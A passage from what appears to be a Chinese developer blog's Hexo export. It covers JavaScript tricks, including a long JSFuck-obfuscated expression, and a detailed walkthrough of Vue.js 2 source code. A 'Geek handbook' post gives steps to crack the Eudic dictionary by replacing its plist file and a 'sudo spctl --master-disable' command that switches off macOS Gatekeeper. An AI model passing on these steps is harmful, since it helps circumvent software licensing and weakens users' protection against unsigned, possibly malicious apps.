]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+&#123;&#125;)[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[]))+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+&#123;&#125;)[+[]])[+[]]+(!+[]+!![]+[])+(+!![]+[])) 15、二进制浮点表示都不是精确的12345// 以下表达式都为trueparseInt(0.0000008) === 8 0.1 + 0.2 === 0.300000000000000040.2-0.1 === 0.10.3-0.2 === 0.09999999999999998 16、最短的代码实现数组去重123let arr = [1, "1", 2, 1, 1, 3]let arr1 = [...new Set(arr)] // [1, "1", 2, 3] Set类似于数组，区别在于它所有的成员都是唯一的，不能有重复的值let arr2 = Array.from(new Set(arr)) // [1, "1", 2, 3] Array.from方法可以将 Set 结构转为数组 17、用最短的代码实现一个长度为m(6)且值都n(8)的数组1Array(6).fill(8) 18、条件判断&amp;&amp;、||123456789101112131415var a = b &amp;&amp; 1// 等价于if (b) &#123; a = 1&#125; else &#123; a = b&#125;var a = b || 1// 等价于if (b) &#123; a = b&#125; else &#123; a = 1&#125; 19、取出一个数组中的最大值和最小值12345var numbers = [5, 458 , 120 , -215 , 228 , 400]var maxInNumbers = Math.max.apply(Math, numbers)var minInNumbers = Math.min.apply(Math, numbers)var maxInNumbers2 = Math.max(...[14, 3, 77]) 20、Function构造函数Function构造函数接受的参数中，第一个是要传入的参数名，第二个是函数内的代码（用字符串来表示）。12var func = new Function('a', 'console.log(a)')func('js') 21、一行代码递归实现斐波那契数列1const fib = (f =&gt; f(f))(f =&gt; n =&gt; [1, 1][n] || f(f)(n - 1) + f(f)(n - 2))]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Geek手册-关于技巧、破解和Hack]]></title>
    <url>%2F2019%2F02%2F19%2FTools%2FGeek%E6%89%8B%E5%86%8C%2F</url>
    <content type="text"><![CDATA[百度网盘倍速播放1videojs.getPlayers("video-player").html5player.tech_.setPlaybackRate(1.5) github 键盘快捷键一览表 shift+/ eudic 欧陆词典破解1.下载plist文件，替换com.eusoft.eudict.plist文件 下载地址：百度网盘 https://pan.baidu.com/disk/home?#/all?vmode=list&amp;path=%2F软件%2F破解文件%2Feudic; 2.使用 Command+ shift + g 到目标路径 ~/Library/Preferences，覆盖目标文件; 3.选中com.eusoft.eudict.plist文件，并锁定, 右键 Get Info -&gt; Locked. Mac 安全与隐私 允许任何来源下载应用开启任何来源: sudo spctl –master-disable关闭任何来源: sudo spctl –master-enable]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
        <tag>Geek</tag>
        <tag>Crack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue源码揭秘]]></title>
    <url>%2F2019%2F02%2F18%2FVue%2Fvue%E6%BA%90%E7%A0%81%E6%8F%AD%E7%A7%98%2F</url>
    <content type="text"><![CDATA[Reactive, component-oriented view layer for modern web interfaces. FlowFlowFlow是facebook 出品的JavaScript 静态类型检查工具。Vue.js 的源码利用了Flow 做了静态类型检查，所以了解Flow 有助于我们阅读源码，并且这种静态类型检查的方式非常有利于大型项目源码的开发和维护。 Vue.js 在做2.0 重构的时候，在ES2015 的基础上，除了ESLint 保证代码风格之外，也引入了Flow 做静态类型检查。之所以选择Flow，主要是因为Babel 和ESLint 都有对应的Flow 插件以支持语法，可以完全沿用现有的构建配置，非常小成本的改动就可以拥有静态类型检查的能力。 Flow 在 Vue.js源码中的应用有时候我们想引用第三方库，或者自定义一些类型，但Flow 并不认识，因此检查的时候会报错。为了解决这类问题，Flow 提出了一个libdef的概念，可以用来识别这些第三方库或者是自定义类型，而Vue.js 也利用了这一特性。在Vue.js 的主目录下有.flowconfig文件，它是Flow 的配置文件，感兴趣的同学可以看官方文档。这其中的[libs]部分用来描述包含指定库定义的目录，默认是名为flow-typed的目录。这里[libs]配置的是flow，表示指定的库定义都在flow文件夹内。 Vue.js 源码目录设计Vue.js 的源码都在 src 目录下，其目录结构如下。1234567src├── compiler # 编译相关。包括把模板解析成 ast 语法树，ast 语法树优化，代码生成等功能。├── core # 核心代码。 Vue.js 的灵魂。包括内置组件、全局 API 封装，Vue 实例化、观察者、虚拟 DOM、工具函数等等。├── platforms # 不同平台的支持。 Vue.js 的入口，2个目录代表2个主要入口，分别打包成运行在 web 上和配合weex跑在native客户端上。├── server # 服务端渲染。跑在服务端的 Node.js，把组件渲染为服务器端的 HTML 字符串，将它们直接发送到浏览器。├── sfc # .vue 文件解析。把.vue文件内容解析成一个 JavaScript 的对象。├── shared # 共享代码。定义被浏览器和服务端的 Vue.js 所共享的工具方法。 功能模块拆分的非常清楚，相关的逻辑放在一个独立的目录下维护，并且把复用的代码也抽成一个独立目录。这样的目录设计让代码的阅读性和可维护性都变强。 Vue.js 源码构建 Runtime Only VS Runtime + CompilerRuntime Only: 借助如 webpack 的 vue-loader 工具把 .vue 文件编译成 JavaScript，因为是在编译阶段做的，所以它只包含运行时的 Vue.js 代码，因此代码体积也会更轻量。Runtime + Compiler: 如果没有对代码做预编译，但又使用了 Vue 的 template 属性并传入一个字符串，则需要在客户端编译模板。这个编译过程对性能会有一定损耗。 从入口开始以Runtime+compiler CommonJS build (CommonJS)为例，入口是 src/platforms/web/entry-runtime-with-compiler.js。 最终在源头src/core/instance/index.js找到Vue的定义，看到了Vue的庐山真面目，它实际上就是一个用 Function 实现的类，我们只能通过 new Vue 去实例化它。// src/core/instance/index.js12345678910111213141516function Vue (options) &#123; if (process.env.NODE_ENV !== 'production' &amp;&amp; !(this instanceof Vue) ) &#123; warn('Vue is a constructor and should be called with the `new` keyword') &#125; this._init(options)&#125;initMixin(Vue)stateMixin(Vue)eventsMixin(Vue)lifecycleMixin(Vue)renderMixin(Vue)export default Vue 为何 Vue 不用 ES6 的 Class 去实现呢？我们往后看这里有很多如 initMixin 的函数调用，并把 Vue 当参数传入，它们的功能都是给 Vue 的 prototype 上扩展一些方法，Vue 按功能把这些扩展分散到多个模块中去实现，而不是在一个模块里实现所有，这种方式是用 Class 难以实现的。这么做的好处是非常方便代码的维护和管理，这种编程技巧也非常值得我们去学习。 initGlobalAPI在src/core/index.js发现，Vue.js 在整个初始化过程中，除了给它的原型 prototype 上扩展方法，还会给 Vue 这个对象本身扩展全局的静态方法，Vue 官网中关于全局 API 都可以在这里找到。它的定义在 src/core/global-api/index.js 中。// src/core/global-api/index.js1234567891011121314151617181920export function initGlobalAPI (Vue: GlobalAPI) &#123; // config const configDef = &#123;&#125; configDef.get = () =&gt; config if (process.env.NODE_ENV !== 'production') &#123; configDef.set = () =&gt; &#123; warn( 'Do not replace the Vue.config object, set individual fields instead.' ) &#125; &#125; Object.defineProperty(Vue, 'config', configDef) Vue.util = &#123; warn, extend, mergeOptions, defineReactive &#125; Vue.set = set Vue.delete = del Vue.nextTick = nextTick // ...&#125; 这里就是在 Vue 上扩展的一些全局方法的定义，Vue 官网中关于全局 API 都可以在这里找到，这里不会介绍细节，会在之后的章节我们具体介绍到某个 API 的时候会详细介绍。有一点要注意的是，Vue.util 暴露的方法最好不要依赖，因为它可能经常会发生变化，是不稳定的。 至此，直观的认识到，Vue本质上就是一个用 Function 实现的 Class，然后它的原型 prototype 以及它本身都扩展了一系列的方法和属性。 数据驱动Vue.js 一个核心思想是数据驱动。所谓数据驱动，是指视图是由数据驱动生成的，我们对视图的修改，不会直接操作 DOM，而是通过修改数据。DOM 变成了数据的映射，我们所有的逻辑都是对数据的修改，而不用碰触 DOM。它相比传统的前端开发，大大简化了代码量。特别是当交互复杂的时候，让代码的逻辑变的非常清晰，利于维护。 new Vue 发生了什么沿着this._init(options)，找到// src/core/instance/init.js1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556export function initMixin (Vue: Class&lt;Component&gt;) &#123; Vue.prototype._init = function (options?: Object) &#123; const vm: Component = this // a uid vm._uid = uid++ let startTag, endTag /* istanbul ignore if */ if (process.env.NODE_ENV !== 'production' &amp;&amp; config.performance &amp;&amp; mark) &#123; startTag = `vue-perf-start:$&#123;vm._uid&#125;` endTag = `vue-perf-end:$&#123;vm._uid&#125;` mark(startTag) &#125; // a flag to avoid this being observed vm._isVue = true // merge options if (options &amp;&amp; options._isComponent) &#123; // optimize internal component instantiation // since dynamic options merging is pretty slow, and none of the // internal component options needs special treatment. initInternalComponent(vm, options) &#125; else &#123; vm.$options = mergeOptions(resolveConstructorOptions(vm.constructor), options || &#123;&#125;, vm) &#125; /* istanbul ignore else */ if (process.env.NODE_ENV !== 'production') &#123; initProxy(vm) &#125; else &#123; vm._renderProxy = vm &#125; // expose real self vm._self = vm initLifecycle(vm) initEvents(vm) initRender(vm) callHook(vm, 'beforeCreate') initInjections(vm) // resolve injections before data/props initState(vm) initProvide(vm) // resolve provide after data/props callHook(vm, 'created') /* istanbul ignore if */ if (process.env.NODE_ENV !== 'production' &amp;&amp; config.performance &amp;&amp; mark) &#123; vm._name = formatComponentName(vm, false) mark(endTag) measure(`vue $&#123;vm._name&#125; init`, startTag, endTag) &#125; if (vm.$options.el) &#123; vm.$mount(vm.$options.el) &#125; &#125;&#125;// ... Vue 初始化主要就干了几件事情，利用mergeOptions合并配置，初始化生命周期，初始化事件中心，初始化渲染，初始化 data、props、computed、watcher 等等。其中， 对new Vue实例初始绑定的data，观察initState() 里面，执行了 initData(vm) 方法，他在vm.$options.data拿到定义的data，并赋值给vm._data ，判断是否在props和methods中已定义过，然后通过proxy(vm, ‘_data’, key)代理，最终 observe(data, true)响应式处理。// src/core/instance/state.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778export function proxy (target: Object, sourceKey: string, key: string) &#123; sharedPropertyDefinition.get = function proxyGetter () &#123; return this[sourceKey][key] &#125; sharedPropertyDefinition.set = function proxySetter (val) &#123; this[sourceKey][key] = val &#125; Object.defineProperty(target, key, sharedPropertyDefinition)&#125;export function initState (vm: Component) &#123; vm._watchers = [] const opts = vm.$options if (opts.props) initProps(vm, opts.props) if (opts.methods) initMethods(vm, opts.methods) if (opts.data) &#123; initData(vm) &#125; else &#123; observe(vm._data = &#123;&#125;, true /* asRootData */) &#125; if (opts.computed) initComputed(vm, opts.computed) if (opts.watch &amp;&amp; opts.watch !== nativeWatch) &#123; initWatch(vm, opts.watch) &#125;&#125;function initData (vm: Component) &#123; let data = vm.$options.data data = vm._data = typeof data === 'function' ? getData(data, vm) : data || &#123;&#125; if (!isPlainObject(data)) &#123; data = &#123;&#125; process.env.NODE_ENV !== 'production' &amp;&amp; warn( 'data functions should return an object:\n' + 'https://vuejs.org/v2/guide/components.html#data-Must-Be-a-Function', vm ) &#125; // proxy data on instance const keys = Object.keys(data) const props = vm.$options.props const methods = vm.$options.methods let i = keys.length while (i--) &#123; const key = keys[i] if (process.env.NODE_ENV !== 'production') &#123; if (methods &amp;&amp; hasOwn(methods, key)) &#123; warn( `Method "$&#123;key&#125;" has already been defined as a data property.`, vm ) &#125; &#125; if (props &amp;&amp; hasOwn(props, key)) &#123; process.env.NODE_ENV !== 'production' &amp;&amp; warn( `The data property "$&#123;key&#125;" is already declared as a prop. ` + `Use prop default value instead.`, vm ) &#125; else if (!isReserved(key)) &#123; proxy(vm, `_data`, key) &#125; &#125; // observe data observe(data, true /* asRootData */)&#125;export function getData (data: Function, vm: Component): any &#123; // #7573 disable dep collection when invoking data getters pushTarget() try &#123; return data.call(vm, vm) &#125; catch (e) &#123; handleError(e, vm, `data()`) return &#123;&#125; &#125; finally &#123; popTarget() &#125;&#125; 这些处理完，初始化的最后，若检测到el，则调用 vm.$mount(vm.$options.el) 挂载vm，把模板渲染成最终的 DOM。 Vue 实例挂载的实现Vue 中我们是通过 $mount 实例方法去挂载 vm 的，$mount 方法在多个文件中都有定义，因为 $mount 这个方法的实现是和平台、构建方式都相关的。重点分析带 compiler 版本的 $mount 实现。// src/platform/web/entry-runtime-with-compiler.js 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869const idToTemplate = cached(id =&gt; &#123; const el = query(id) return el &amp;&amp; el.innerHTML&#125;)const mount = Vue.prototype.$mountVue.prototype.$mount = function (el?: string | Element, hydrating?: boolean): Component &#123; el = el &amp;&amp; query(el) /* istanbul ignore if */ if (el === document.body || el === document.documentElement) &#123; process.env.NODE_ENV !== 'production' &amp;&amp; warn( `Do not mount Vue to &lt;html&gt; or &lt;body&gt; - mount to normal elements instead.` ) return this &#125; const options = this.$options // resolve template/el and convert to render function if (!options.render) &#123; let template = options.template if (template) &#123; if (typeof template === 'string') &#123; if (template.charAt(0) === '#') &#123; template = idToTemplate(template) /* istanbul ignore if */ if (process.env.NODE_ENV !== 'production' &amp;&amp; !template) &#123; warn( `Template element not found or is empty: $&#123;options.template&#125;`, this ) &#125; &#125; &#125; else if (template.nodeType) &#123; template = template.innerHTML &#125; else &#123; if (process.env.NODE_ENV !== 'production') &#123; warn('invalid template option:' + template, this) &#125; return this &#125; &#125; else if (el) &#123; template = getOuterHTML(el) &#125; if (template) &#123; /* istanbul ignore if */ if (process.env.NODE_ENV !== 'production' &amp;&amp; config.performance &amp;&amp; mark) &#123; mark('compile') &#125; const &#123; render, staticRenderFns &#125; = compileToFunctions(template, &#123; outputSourceRange: process.env.NODE_ENV !== 'production', shouldDecodeNewlines, shouldDecodeNewlinesForHref, delimiters: options.delimiters, comments: options.comments &#125;, this) options.render = render options.staticRenderFns = staticRenderFns /* istanbul ignore if */ if (process.env.NODE_ENV !== 'production' &amp;&amp; config.performance &amp;&amp; mark) &#123; mark('compile end') measure(`vue $&#123;this._name&#125; compile`, 'compile', 'compile end') &#125; &#125; &#125; return mount.call(this, el, hydrating)&#125; 这段代码首先缓存了原型上的 $mount 方法，再重新定义该方法。首先，它对 el 做了限制，Vue 不能挂载在 body、html 这样的根节点上。接下来的是很关键的逻辑 —— 如果没有定义 render 方法，则会把 el 或者 template 字符串转换成 render 方法。这里我们要牢记，在 Vue 2.0 版本中，所有 Vue 的组件的渲染最终都需要 render 方法，无论我们是用单文件 .vue 方式开发组件，还是写了 el 或者 template 属性，最终都会转换成 render 方法，那么这个过程是 Vue 的一个“在线编译”的过程，它是调用 compileToFunctions 方法实现的。最后，调用原先原型上的 $mount 方法挂载。 原先原型上的 $mount 方法在 src/platform/web/runtime/index.js 中定义，之所以这么设计完全是为了复用，因为它是可以被 runtime only 版本的 Vue 直接使用的。// src/platform/web/runtime/index.js1234Vue.prototype.$mount = function ( el?: string | Element, hydrating?: boolean): Component &#123; el = el &amp;&amp; inBrowser ? query(el) : undefined return mountComponent(this, el, hydrating)&#125; $mount 方法支持传入 2 个参数，第一个是 el，它表示挂载的元素，可以是字符串，也可以是 DOM 对象，如果是字符串在浏览器环境下会调用 query 方法转换成 DOM 对象的。第二个参数是和服务端渲染相关，在浏览器环境下我们不需要传第二个参数。 $mount 方法实际上会去调用 mountComponent 方法:// src/core/instance/lifecycle.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869export function mountComponent (vm: Component, el: ?Element, hydrating?: boolean): Component &#123; vm.$el = el if (!vm.$options.render) &#123; vm.$options.render = createEmptyVNode if (process.env.NODE_ENV !== 'production') &#123; /* istanbul ignore if */ if ((vm.$options.template &amp;&amp; vm.$options.template.charAt(0) !== '#') || vm.$options.el || el) &#123; warn( 'You are using the runtime-only build of Vue where the template ' + 'compiler is not available. Either pre-compile the templates into ' + 'render functions, or use the compiler-included build.', vm ) &#125; else &#123; warn( 'Failed to mount component: template or render function not defined.', vm ) &#125; &#125; &#125; callHook(vm, 'beforeMount') let updateComponent /* istanbul ignore if */ if (process.env.NODE_ENV !== 'production' &amp;&amp; config.performance &amp;&amp; mark) &#123; updateComponent = () =&gt; &#123; const name = vm._name const id = vm._uid const startTag = `vue-perf-start:$&#123;id&#125;` const endTag = `vue-perf-end:$&#123;id&#125;` mark(startTag) const vnode = vm._render() mark(endTag) measure(`vue $&#123;name&#125; render`, startTag, endTag) mark(startTag) vm._update(vnode, hydrating) mark(endTag) measure(`vue $&#123;name&#125; patch`, startTag, endTag) &#125; &#125; else &#123; updateComponent = () =&gt; &#123; vm._update(vm._render(), hydrating) &#125; &#125; // we set this to vm._watcher inside the watcher's constructor // since the watcher's initial patch may call $forceUpdate (e.g. inside child // component's mounted hook), which relies on vm._watcher being already defined new Watcher(vm, updateComponent, noop, &#123; before () &#123; if (vm._isMounted &amp;&amp; !vm._isDestroyed) &#123; callHook(vm, 'beforeUpdate') &#125; &#125; &#125;, true /* isRenderWatcher */) hydrating = false // manually mounted instance, call mounted on self // mounted is called for render-created child components in its inserted hook if (vm.$vnode == null) &#123; vm._isMounted = true callHook(vm, 'mounted') &#125; return vm&#125; 从上面的代码可以看到，mountComponent 核心就是先调用 vm._render 方法先生成虚拟 Node，再实例化一个渲染Watcher，在它的回调函数中会调用 updateComponent 方法，最终调用 vm._update 更新 DOM。 Watcher 在这里起到两个作用，一个是初始化的时候会执行回调函数，另一个是当 vm 实例中的监测的数据发生变化的时候执行回调函数，这块儿我们会在之后的章节中介绍。 函数最后判断为根节点的时候设置 vm._isMounted 为 true， 表示这个实例已经挂载了，同时执行 mounted 钩子函数。 这里注意 vm.$vnode 表示 Vue 实例的父虚拟 Node，所以它为 Null 则表示当前是根 Vue 的实例。 mountComponent 方法的逻辑也是非常清晰的，它会完成整个渲染工作，接下来我们要重点分析其中的细节，也就是最核心的 2 个方法：vm._render 和 vm._update。 renderVue 的 _render 方法是实例的一个私有方法，它用来把实例渲染成一个虚拟 Node。// src/core/instance/render.js12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061Vue.prototype._render = function (): VNode &#123; const vm: Component = this const &#123; render, _parentVnode &#125; = vm.$options if (_parentVnode) &#123; vm.$scopedSlots = normalizeScopedSlots( _parentVnode.data.scopedSlots, vm.$slots, vm.$scopedSlots ) &#125; // set parent vnode. this allows render functions to have access // to the data on the placeholder node. vm.$vnode = _parentVnode // render self let vnode try &#123; // There's no need to maintain a stack becaues all render fns are called // separately from one another. Nested component's render fns are called // when parent component is patched. currentRenderingInstance = vm vnode = render.call(vm._renderProxy, vm.$createElement) &#125; catch (e) &#123; handleError(e, vm, `render`) // return error render result, // or previous vnode to prevent render error causing blank component /* istanbul ignore else */ if (process.env.NODE_ENV !== 'production' &amp;&amp; vm.$options.renderError) &#123; try &#123; vnode = vm.$options.renderError.call(vm._renderProxy, vm.$createElement, e) &#125; catch (e) &#123; handleError(e, vm, `renderError`) vnode = vm._vnode &#125; &#125; else &#123; vnode = vm._vnode &#125; &#125; finally &#123; currentRenderingInstance = null &#125; // if the returned array contains only a single node, allow it if (Array.isArray(vnode) &amp;&amp; vnode.length === 1) &#123; vnode = vnode[0] &#125; // return empty vnode in case the render function errored out if (!(vnode instanceof VNode)) &#123; if (process.env.NODE_ENV !== 'production' &amp;&amp; Array.isArray(vnode)) &#123; warn( 'Multiple root nodes returned from render function. Render function ' + 'should return a single root node.', vm ) &#125; vnode = createEmptyVNode() &#125; // set parent vnode.parent = _parentVnode return vnode &#125;&#125; 这段代码最关键的是 render 方法的调用，即vnode = render.call(vm._renderProxy, vm.$createElement)。render 函数中的 createElement 方法就是 vm.$createElement 方法，定义是在执行 initRender 方法的时候。// src/core/instance/render.js123456789101112export function initRender (vm: Component) &#123; // bind the createElement fn to this instance // so that we get proper render context inside it. // args order: tag, data, children, normalizationType, alwaysNormalize // internal version is used by render functions compiled from templates vm._c = (a, b, c, d) =&gt; createElement(vm, a, b, c, d, false) // normalization is always applied for the public version, used in // user-written render functions. vm.$createElement = (a, b, c, d) =&gt; createElement(vm, a, b, c, d, true) // ...&#125; 可以看到除了 vm.$createElement 方法，还有一个 vm._c 方法，它是被模板编译成的 render 函数使用，而 vm.$createElement 是用户手写 render 方法使用的， 这俩个方法支持的参数相同，并且内部都调用了 createElement 方法。createElement 方法实际上是对 _createElement 方法的封装，它允许传入的参数更加灵活，在处理这些参数后，调用真正创建 VNode 的函数 _createElement。// src/core/vdom/create-element.js123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103export function createElement ( context: Component, tag: any, data: any, children: any, normalizationType: any, alwaysNormalize: boolean): VNode | Array&lt;VNode&gt; &#123; if (Array.isArray(data) || isPrimitive(data)) &#123; normalizationType = children children = data data = undefined &#125; if (isTrue(alwaysNormalize)) &#123; normalizationType = ALWAYS_NORMALIZE &#125; return _createElement(context, tag, data, children, normalizationType)&#125;export function _createElement ( context: Component, tag?: string | Class&lt;Component&gt; | Function | Object, data?: VNodeData, children?: any, normalizationType?: number): VNode | Array&lt;VNode&gt; &#123; if (isDef(data) &amp;&amp; isDef((data: any).__ob__)) &#123; process.env.NODE_ENV !== 'production' &amp;&amp; warn( `Avoid using observed data object as vnode data: $&#123;JSON.stringify(data)&#125;\n` + 'Always create fresh vnode data objects in each render!', context ) return createEmptyVNode() &#125; // object syntax in v-bind if (isDef(data) &amp;&amp; isDef(data.is)) &#123; tag = data.is &#125; if (!tag) &#123; // in case of component :is set to falsy value return createEmptyVNode() &#125; // warn against non-primitive key if (process.env.NODE_ENV !== 'production' &amp;&amp; isDef(data) &amp;&amp; isDef(data.key) &amp;&amp; !isPrimitive(data.key) ) &#123; if (!__WEEX__ || !('@binding' in data.key)) &#123; warn( 'Avoid using non-primitive value as key, ' + 'use string/number value instead.', context ) &#125; &#125; // support single function children as default scoped slot if (Array.isArray(children) &amp;&amp; typeof children[0] === 'function' ) &#123; data = data || &#123;&#125; data.scopedSlots = &#123; default: children[0] &#125; children.length = 0 &#125; if (normalizationType === ALWAYS_NORMALIZE) &#123; children = normalizeChildren(children) &#125; else if (normalizationType === SIMPLE_NORMALIZE) &#123; children = simpleNormalizeChildren(children) &#125; let vnode, ns if (typeof tag === 'string') &#123; let Ctor ns = (context.$vnode &amp;&amp; context.$vnode.ns) || config.getTagNamespace(tag) if (config.isReservedTag(tag)) &#123; // platform built-in elements vnode = new VNode( config.parsePlatformTagName(tag), data, children, undefined, undefined, context ) &#125; else if ((!data || !data.pre) &amp;&amp; isDef(Ctor = resolveAsset(context.$options, 'components', tag))) &#123; // component vnode = createComponent(Ctor, data, context, children, tag) &#125; else &#123; // unknown or unlisted namespaced elements // check at runtime because it may get assigned a namespace when its // parent normalizes children vnode = new VNode( tag, data, children, undefined, undefined, context ) &#125; &#125; else &#123; // direct component options / constructor vnode = createComponent(tag, data, context, children) &#125; if (Array.isArray(vnode)) &#123; return vnode &#125; else if (isDef(vnode)) &#123; if (isDef(ns)) applyNS(vnode, ns) if (isDef(data)) registerDeepBindings(data) return vnode &#125; else &#123; return createEmptyVNode() &#125;&#125; vm._render 最终是通过执行 createElement 方法并返回的是 vnode，它是一个虚拟 Node。Vue 2.0 相比 Vue 1.0 最大的升级就是利用了 Virtual DOM。 每个 VNode 有 children，children 每个元素也是一个 VNode，这样就形成了一个 VNode Tree，它很好的描述了我们的 DOM Tree。 对children 的规范化，由于 Virtual DOM 实际上是一个树状结构，每一个 VNode 可能会有若干个子节点，这些子节点应该也是 VNode 的类型。_createElement 接收的第 4 个参数 children 是任意类型的，因此我们需要把把children 变成了一个为 VNode类型的 Array。这里根据 normalizationType 的不同，调用了 normalizeChildren(children) 和 simpleNormalizeChildren(children) 方法。// src/core/vdom/helpers/normalize-children.js12345678910111213141516export function simpleNormalizeChildren (children: any) &#123; for (let i = 0; i &lt; children.length; i++) &#123; if (Array.isArray(children[i])) &#123; return Array.prototype.concat.apply([], children) &#125; &#125; return children&#125;export function normalizeChildren (children: any): ?Array&lt;VNode&gt; &#123; return isPrimitive(children) ? [createTextVNode(children)] : Array.isArray(children) ? normalizeArrayChildren(children) : undefined&#125; Virtual DOM浏览器中的 DOM 是很“昂贵”，设计的非常复杂。当我们频繁的去做 DOM 更新，会产生一定的性能问题。而 Virtual DOM 就是用一个原生的 JS 对象去描述一个 DOM 节点，所以它比创建一个 DOM 的代价要小很多。在 Vue.js 中，Virtual DOM 是用 VNode 这么一个 Class 去描述，它是定义在 src/core/vdom/vnode.js 中的。// src/core/vdom/vnode.js 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970export default class VNode &#123; tag: string | void; data: VNodeData | void; children: ?Array&lt;VNode&gt;; text: string | void; elm: Node | void; ns: string | void; context: 